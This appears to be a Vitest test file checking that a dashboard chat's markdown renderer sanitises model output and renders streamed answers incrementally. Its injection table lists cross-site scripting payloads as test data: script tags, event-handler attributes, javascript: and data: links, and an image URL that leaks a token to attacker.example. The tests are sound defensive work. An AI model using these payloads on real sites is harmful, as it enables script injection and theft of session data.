// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import {
	createIncrementalMarkdown,
	renderMarkdown,
} from "../../app/chat/utils/markdown";

/** The only markup model output may bring into the dashboard's document. */
const ALLOWED_ELEMENTS = new Set([
	"a",
	"blockquote",
	"br",
	"code",
	"del",
	"em",
	"h1",
	"h2",
	"h3",
	"h4",
	"h5",
	"h6",
	"hr",
	"li",
	"ol",
	"p",
	"pre",
	"s",
	"strong",
	"table",
	"tbody",
	"td",
	"th",
	"thead",
	"tr",
	"ul",
]);
const ALLOWED_ATTRIBUTES = new Set(["href", "title", "target", "rel", "start"]);
const SAFE_HREF = /^(?:https?:|mailto:|\/(?![/\\])|#)/i;

function renderInDocument(source: string): HTMLElement {
	const host = document.createElement("div");
	host.innerHTML = renderMarkdown(source);
	return host;
}

/**
 * Walks what the browser would build from the HTML: whatever the model wrote,
 * only allowed elements and attributes, and links that cannot run code. What
 * was refused stays on screen as text, which is harmless.
 */
function expectHarmless(html: string): void {
	const host = document.createElement("div");
	host.innerHTML = html;
	for (const element of host.querySelectorAll("*")) {
		expect(ALLOWED_ELEMENTS.has(element.localName), element.localName).toBe(
			true,
		);
		for (const attribute of element.attributes) {
			expect(ALLOWED_ATTRIBUTES.has(attribute.name), attribute.name).toBe(true);
		}
		const href = element.getAttribute("href");
		if (href !== null) expect(href).toMatch(SAFE_HREF);
	}
}

describe("model output renders as inert markup", () => {
	const injections: Record<string, string> = {
		"a raw script": "<script>fetch('/api/_auth/session')</script>",
		"an image with an error handler":
			'<img src=x onerror="alert(document.cookie)">',
		"an svg with a load handler": "<svg onload=alert(1)><circle/></svg>",
		"an iframe": '<iframe src="https://attacker.example"></iframe>',
		"a style block dressing up the page":
			"<style>body{position:fixed;inset:0;background:red}</style>",
		"a form": '<form action="https://attacker.example"><input name=q></form>',
		"a details toggle": "<details open ontoggle=alert(1)>x</details>",
		"a javascript link": "[click](javascript:alert(document.cookie))",
		"a mixed-case javascript link": "[click](JaVaScRiPt:alert(1))",
		"an entity-encoded javascript link": "[click](&#106;avascript:alert(1))",
		"a tab-split javascript link": "[click](java\tscript:alert(1))",
		"a vbscript link": "[click](vbscript:msgbox(1))",
		"a data: html link":
			"[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
		"a javascript autolink": "<javascript:alert(1)>",
		"a javascript reference link": "[click][x]\n\n[x]: javascript:alert(1)",
		"a title breaking out of its attribute":
			'[a](https://example.com "x\\" onmouseover=\\"alert(1)")',
		"a raw anchor": '<a href="javascript:alert(1)">x</a>',
		"a fenced code language dressing the block": "```fixed inset-0\ncode\n```",
		"a remote markdown image":
			"![secret](https://attacker.example/leak.png?token=SECRET)",
		"a relative markdown image": "![events](/ai/channel/events)",
		"a data image": "![x](data:image/png;base64,iVBORw0KGgo=)",
		"a table alignment": "| a |\n|:-:|\n| b |",
	};

	for (const [name, source] of Object.entries(injections)) {
		it(`neutralises ${name}`, () => {
			expectHarmless(renderMarkdown(source));
		});
	}

	it("shows a refused link as its text, with nothing to click", () => {
		const host = renderInDocument("[click](javascript:alert(document.cookie))");
		expect(host.querySelector("a")).toBeNull();
		expect(host.textContent).toContain("[click]");
	});

	it("keeps a quote in a link title inside the attribute", () => {
		const host = renderInDocument(
			'[a](https://example.com "x\\" onmouseover=\\"alert(1)")',
		);
		const link = host.querySelector("a");
		expect(link?.getAttribute("onmouseover")).toBeNull();
		expect(link?.getAttribute("title")).toBe('x" onmouseover="alert(1)');
	});

	it("keeps raw HTML as visible text rather than markup", () => {
		const host = renderInDocument("<b>bold</b> <script>x()</script>");
		expect(host.querySelector("b, script")).toBeNull();
		expect(host.textContent).toContain("<b>bold</b>");
	});

	it("turns an image into a link to follow, so nothing is fetched on its own", () => {
		const host = renderInDocument(
			"![a chart](https://example.com/chart.png?q=1)",
		);
		expect(host.querySelector("img")).toBeNull();
		const link = host.querySelector("a");
		expect(link?.getAttribute("href")).toBe(
			"https://example.com/chart.png?q=1",
		);
		expect(link?.textContent).toBe("a chart (example.com)");
	});

	it("names where an image link leads, so a harmless caption cannot hide it", () => {
		const host = renderInDocument(
			"![Click to view](https://attacker.example/leak.png?token=SECRET) ![](https://cdn.example/x.png) ![events](/ai/channel/events)",
		);
		expect(
			[...host.querySelectorAll("a")].map((link) => link.textContent),
		).toEqual([
			"Click to view (attacker.example)",
			"cdn.example",
			"events (/ai/channel/events)",
		]);
	});

	it("opens every link in a new tab that cannot reach back to the dashboard", () => {
		const host = renderInDocument(
			"[docs](https://antelopejs.com) and https://example.com/page",
		);
		const links = [...host.querySelectorAll("a")];
		expect(links).toHaveLength(2);
		for (const link of links) {
			expect(link.getAttribute("target")).toBe("_blank");
			expect(link.getAttribute("rel")).toBe("noopener noreferrer");
		}
	});

	it("keeps the safe links: https, mailto and pages of the dashboard", () => {
		const host = renderInDocument(
			"[a](https://example.com) [b](mailto:dev@example.com) [c](/modules/ai/settings)",
		);
		expect(
			[...host.querySelectorAll("a")].map((link) => link.getAttribute("href")),
		).toEqual([
			"https://example.com",
			"mailto:dev@example.com",
			"/modules/ai/settings",
		]);
	});

	it("still renders the markdown an answer is made of", () => {
		const host = renderInDocument(
			"# Title\n\n- **bold** and *em* and ~~gone~~\n- `code`\n\n```ts\nconst a = 1\n```\n\n> quote\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n---",
		);
		for (const tag of [
			"h1",
			"ul",
			"strong",
			"em",
			"s",
			"code",
			"pre",
			"blockquote",
			"table",
			"hr",
		]) {
			expect(host.querySelector(tag), tag).not.toBeNull();
		}
	});

	it("does not touch the sanitizer the rest of the dashboard shares", async () => {
		const shared = (await import("dompurify")).default;
		renderMarkdown("[x](https://example.com)");
		expect(shared.sanitize('<a href="https://example.com">x</a>')).not.toMatch(
			/target=/,
		);
	});
});

describe("a streaming answer renders incrementally", () => {
	const ANSWER =
		"# Plan\n\nFirst paragraph with **bold** text.\n\n- one\n- two\n\n  still two\n- three\n\n```ts\nconst x = 1;\n\nconst y = 2;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nLast paragraph, [a link](https://example.com).";

	function streamInChunks(text: string, size: number) {
		const incremental = createIncrementalMarkdown();
		let last = { settled: [] as readonly string[], open: "" };
		for (let end = size; end < text.length + size; end += size) {
			last = incremental.render(text.slice(0, Math.min(end, text.length)));
		}
		return last;
	}

	for (const size of [1, 3, 7, 50]) {
		it(`ends with what a whole render gives, in chunks of ${size}`, () => {
			const { settled, open } = streamInChunks(ANSWER, size);
			expect([...settled, open].join("")).toBe(renderMarkdown(ANSWER));
		});
	}

	it("renders each settled block once, however many chunks follow it", () => {
		const incremental = createIncrementalMarkdown();
		const first = incremental.render("Settled paragraph.\n\nOpen");
		const later = incremental.render("Settled paragraph.\n\nOpen and growing");
		expect(first.settled).toEqual(["<p>Settled paragraph.</p>\n"]);
		expect(later.settled[0]).toBe(first.settled[0]);
		expect(later.open).toBe("<p>Open and growing</p>\n");
	});

	it("keeps a code block open until its fence closes", () => {
		const incremental = createIncrementalMarkdown();
		const open = incremental.render("```ts\nconst a = 1;\n\nconst b = 2;");
		expect(open.settled).toEqual([]);
		const closed = incremental.render(
			"```ts\nconst a = 1;\n\nconst b = 2;\n```\n\nAfter.",
		);
		expect(closed.settled).toHaveLength(1);
		expect(closed.settled[0]).toContain("const b = 2;");
		expect(closed.open).toBe("<p>After.</p>\n");
	});

	it("starts over when the text is replaced rather than extended", () => {
		const incremental = createIncrementalMarkdown();
		incremental.render("One.\n\nTwo");
		const replaced = incremental.render("Other.\n\nText");
		expect(replaced.settled).toEqual(["<p>Other.</p>\n"]);
	});

	it("sanitizes what it renders incrementally too", () => {
		const incremental = createIncrementalMarkdown();
		const { settled, open } = incremental.render(
			"[x](javascript:alert(1))\n\n![y](https://attacker.example/?q=1)",
		);
		expectHarmless([...settled, open].join(""));
	});

	it("keeps its work per chunk bounded by the last block, not the whole answer", () => {
		const paragraphs = Array.from(
			{ length: 400 },
			(_, index) => `Paragraph ${index} with some **words** in it.`,
		).join("\n\n");
		const incremental = createIncrementalMarkdown();
		let renderedChars = 0;
		for (let end = 40; end <= paragraphs.length; end += 40) {
			const { open } = incremental.render(paragraphs.slice(0, end));
			renderedChars += open.length;
		}
		expect(renderedChars).toBeLessThan(paragraphs.length * 5);
	});
});
